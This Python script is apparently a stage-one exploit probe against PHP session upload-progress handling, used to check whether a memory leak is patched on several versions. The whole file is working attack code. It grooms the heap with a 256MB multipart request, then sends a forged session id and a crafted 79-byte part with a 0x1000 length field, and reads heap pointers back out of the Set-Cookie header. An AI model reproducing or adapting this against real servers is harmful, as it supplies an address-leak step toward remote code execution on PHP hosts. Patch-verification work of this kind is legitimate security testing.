#!/usr/bin/env python3
"""Quick stage-1 leak probe on a port: prime 256MB OOM + reclaim (19-char forged id +
79B part len=0x1000). Reports Set-Cookie length. >1000B w/ 0x7F ptrs = LEAK; 0/32B = closed.
Used to confirm the sub-8.3 leak is closed on the 4 not-yet-individually-tested versions.
"""
import http.client, struct, time, sys

PORT = int(sys.argv[1])
H = 0x7F0000000000

def scan(data, need=8):
    best = {}
    for off in range(len(data) - 8):
        v = int.from_bytes(data[off:off+8], "little")
        if H <= v < H + 0x10000000000:
            best[v & ~0x1FFFFF] = best.get(v & ~0x1FFFFF, 0) + 1
    if best:
        b, c = max(best.items(), key=lambda kv: kv[1])
        if c >= 8: return b
    return 0

def do(req_lines, body, timeout=90):
    c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=timeout)
    c.putrequest("POST", "/", skip_host=True)
    for l in req_lines: c.putheader(l.split(":", 1)[0], l.split(":", 1)[1].strip())
    c.endheaders(); c.send(body)
    r = c.getresponse(); d = r.read(); c.close(); return d

def mp(parts, big=None):
    bd = "----b"; out = b""
    for name, val in parts:
        out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n").encode() + val + b"\r\n"
    if big:
        out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"big\"\r\n\r\n").encode() + big + b"\r\n"
    out += f"--{bd}--\r\n".encode(); return out

def cookie_of(r):
    for line in r.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"phpsessid" in line.lower():
            return line.split(b":", 1)[1].strip()
    return b""

SID = b"attacksessionid0001"  # 19-char forged id
prime = [(f"p{i:04d}", b"x") for i in range(1001)]
prime.append(("PHPSESSID", b"\x00")); prime.append(("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"))
bodyA = mp(prime, big=b"B" * (256 * 1024 * 1024))
try:
    do(["Content-Type: multipart/form-data; boundary=b", "Content-Length: %d" % len(bodyA)], bodyA, timeout=90)
except Exception as e:
    print(f"  prime: {e}", flush=True)
time.sleep(0.3)
rec = [("PHPSESSID", SID), ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
for i in range(841):
    rec.append((str(1000+i), (f"v{i:04d}"+"x"*44)[:48].encode()))
forged = bytearray(b"A"*79); struct.pack_into("<Q", forged, 0x10, 0x1000); forged[0x18]=ord("L")
rec.append(("1999", bytes(forged)))
r2 = do(["Content-Type: multipart/form-data; boundary=b", "Content-Length: %d" % len(mp(rec))], mp(rec), timeout=60)
ck = cookie_of(r2)
base = scan(ck)
verdict = "LEAK" if (base and len(ck) > 1000) else "closed"
bs = ("0x%012x" % base) if base else "-"
print(f"  port {PORT}: cookie={len(ck)}B base={bs} -> {verdict}", flush=True)
